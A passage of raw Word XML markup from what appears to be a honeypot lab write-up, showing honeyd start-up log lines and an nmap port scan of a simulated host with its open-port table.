          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(c) 2002-2007 N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>rovos honeyd[4546]:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>-i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p4p1 -d -f honeyd.conf</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-20"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>arn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>poss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SI range </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ngerp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:t>M OS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>400</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>4R2M0"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="63"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-20"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>arn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>poss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SI range </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ngerp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>crosoft</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ndows NT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>4.0 SP3" honeyd[4546]:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>scuous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y on p4p1:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">(arp or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o 47 or (udp and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>rc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>67 and dst port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>68) or (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p )) and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>src 48</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>0f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>6d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>60</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>57</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1060" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>honeyd[4546]:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Runn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>eges</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-20"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>nal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId51">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nmap -p 135,139,445,1337 172.16.8.13</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="2696" w:hanging="710"/>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:hyperlink r:id="rId52">
        <w:r>
          <w:t>ap 5.00 ( h</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>tt</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>p</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>://</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>n</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>m</w:t>
        </w:r>
        <w:r>
          <w:t>ap.o</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-4"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:t>g</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> ) at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1-05-06 13</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>DT In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ng por</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s on so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>eone</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(172.20.73.77):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>PO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">T            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-19"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">E          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="58"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-20"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>VICE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>135</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cp          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>srpc</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>139</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cp          </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>os-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>sn</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>445</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">c            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">open              </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="52"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>crosof</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>-ds</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>1337</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cp        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">osed            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>was</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>MAC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Addre</w:t>
      </w:r>
      <w:r>
